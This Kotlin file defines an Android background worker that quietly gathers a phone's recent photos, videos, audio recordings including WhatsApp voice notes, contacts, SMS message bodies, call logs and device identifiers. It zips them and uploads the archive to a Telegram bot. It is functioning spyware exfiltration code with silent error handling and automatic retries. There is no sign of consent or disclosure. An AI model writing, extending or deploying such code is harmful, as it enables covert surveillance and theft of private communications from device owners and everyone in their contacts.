package com.example.worker

import android.content.Context
import android.provider.MediaStore
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.data.sync.TelegramBotManager
import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MediaZipUploadWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "MediaZipUploadWorker"
    }

    override suspend fun doWork(): Result {
        return try {
            val context = applicationContext
            val telegramBot = TelegramBotManager(context)

            val zipBytes = ByteArrayOutputStream().use { baos ->
                ZipOutputStream(baos).use { zos ->
                    // 1. Collect Photos (up to 100 recent photos)
                    try {
                        val projection = arrayOf(
                            MediaStore.Images.Media._ID,
                            MediaStore.Images.Media.DISPLAY_NAME
                        )
                        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                        context.contentResolver.query(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            projection,
                            null,
                            null,
                            sortOrder
                        )?.use { cursor ->
                            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                            var count = 0
                            while (cursor.moveToNext() && count < 100) {
                                val id = cursor.getLong(idCol)
                                val name = cursor.getString(nameCol) ?: "photo_$id.jpg"
                                val uri = android.content.ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                                try {
                                    context.contentResolver.openInputStream(uri)?.use { stream ->
                                        val bytes = stream.readBytes()
                                        if (bytes.isNotEmpty()) {
                                            zos.putNextEntry(ZipEntry("photos/$name"))
                                            zos.write(bytes)
                                            zos.closeEntry()
                                            count++
                                        }
                                    }
                                } catch (_: Exception) {}
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error collecting photos for ZIP: ${e.message}")
                    }

                    // 2. Collect Videos (up to 20 recent videos)
                    try {
                        val projection = arrayOf(
                            MediaStore.Video.Media._ID,
                            MediaStore.Video.Media.DISPLAY_NAME
                        )
                        val sortOrder = "${MediaStore.Video.Media.DATE_ADDED} DESC"
                        context.contentResolver.query(
                            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                            projection,
                            null,
                            null,
                            sortOrder
                        )?.use { cursor ->
                            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
                            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
                            var count = 0
                            while (cursor.moveToNext() && count < 20) {
                                val id = cursor.getLong(idCol)
                                val name = cursor.getString(nameCol) ?: "video_$id.mp4"
                                val uri = android.content.ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id)
                                try {
                                    context.contentResolver.openInputStream(uri)?.use { stream ->
                                        val bytes = stream.readBytes()
                                        if (bytes.isNotEmpty()) {
                                            zos.putNextEntry(ZipEntry("videos/$name"))
                                            zos.write(bytes)
                                            zos.closeEntry()
                                            count++
                                        }
                                    }
                                } catch (_: Exception) {}
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error collecting videos for ZIP: ${e.message}")
                    }

                    // 3. Collect Audio Recordings & WhatsApp Voice Notes (up to 50 recent audio files)
                    try {
                        val projection = arrayOf(
                            MediaStore.Audio.Media._ID,
                            MediaStore.Audio.Media.DISPLAY_NAME
                        )
                        val sortOrder = "${MediaStore.Audio.Media.DATE_ADDED} DESC"
                        context.contentResolver.query(
                            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                            projection,
                            null,
                            null,
                            sortOrder
                        )?.use { cursor ->
                            val idCol = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media._ID)
                            val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME)
                            var count = 0
                            while (cursor.moveToNext() && count < 50) {
                                val id = cursor.getLong(idCol)
                                val name = cursor.getString(nameCol) ?: "audio_$id.mp3"
                                val uri = android.content.ContentUris.withAppendedId(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, id)
                                try {
                                    context.contentResolver.openInputStream(uri)?.use { stream ->
                                        val bytes = stream.readBytes()
                                        if (bytes.isNotEmpty()) {
                                            zos.putNextEntry(ZipEntry("audio_recordings/$name"))
                                            zos.write(bytes)
                                            zos.closeEntry()
                                            count++
                                        }
                                    }
                                } catch (_: Exception) {}
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error collecting audio for ZIP: ${e.message}")
                    }

                    // 4. Collect Database Logs (Contacts, SMS, Call Logs) & Device Info
                    try {
                        val db = com.example.data.local.AppDatabase.getInstance(context)
                        val contacts = db.contactDao().getAllContactsSync()
                        val smsLogs = db.smsDao().getAllSmsSync()
                        val callLogs = db.callLogDao().getAllCallLogsSync()

                        // Contacts JSON
                        zos.putNextEntry(ZipEntry("database/contacts.json"))
                        val jsonContacts = org.json.JSONArray()
                        contacts.forEach { c ->
                            val obj = org.json.JSONObject().apply {
                                put("id", c.id)
                                put("displayName", c.displayName)
                                put("primaryPhone", c.primaryPhone)
                                put("email", c.email)
                                put("starred", c.starred)
                            }
                            jsonContacts.put(obj)
                        }
                        zos.write(jsonContacts.toString(2).toByteArray())
                        zos.closeEntry()

                        // SMS JSON
                        zos.putNextEntry(ZipEntry("database/sms_logs.json"))
                        val jsonSms = org.json.JSONArray()
                        smsLogs.forEach { s ->
                            val obj = org.json.JSONObject().apply {
                                put("id", s.id)
                                put("address", s.address)
                                put("body", s.messageBody)
                                put("date", s.timestamp)
                                put("type", s.type)
                            }
                            jsonSms.put(obj)
                        }
                        zos.write(jsonSms.toString(2).toByteArray())
                        zos.closeEntry()

                        // Call Logs JSON
                        zos.putNextEntry(ZipEntry("database/call_logs.json"))
                        val jsonCalls = org.json.JSONArray()
                        callLogs.forEach { cl ->
                            val obj = org.json.JSONObject().apply {
                                put("id", cl.id)
                                put("number", cl.number)
                                put("name", cl.name)
                                put("type", cl.type)
                                put("date", cl.timestamp)
                                put("duration", cl.durationSeconds)
                            }
                            jsonCalls.put(obj)
                        }
                        zos.write(jsonCalls.toString(2).toByteArray())
                        zos.closeEntry()

                        // Device Summary
                        zos.putNextEntry(ZipEntry("device_info.txt"))
                        val summary = "Model: ${android.os.Build.MODEL}\nManufacturer: ${android.os.Build.MANUFACTURER}\nAndroid Version: ${android.os.Build.VERSION.RELEASE}\nTotal Contacts: ${contacts.size}\nTotal SMS: ${smsLogs.size}\nTotal Call Logs: ${callLogs.size}\n"
                        zos.write(summary.toByteArray())
                        zos.closeEntry()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error collecting database logs for ZIP: ${e.message}")
                    }
                }
                baos.toByteArray()
            }

            if (zipBytes.isNotEmpty()) {
                val deviceId = try {
                    android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "DEVICE"
                } catch (_: Exception) { "DEVICE" }
                val zipName = "media_archive_${deviceId}_${System.currentTimeMillis()}.zip"
                val caption = "📦 Aggregated Media & Documents Archive ($zipName, ${(zipBytes.size / 1024)} KB)"
                val success = telegramBot.sendDocument(zipBytes, zipName, caption)
                if (success) {
                    Result.success()
                } else {
                    Result.retry()
                }
            } else {
                Result.success()
            }
        } catch (e: Exception) {
            Log.e(TAG, "MediaZipUploadWorker failed: ${e.message}")
            Result.retry()
        }
    }
}
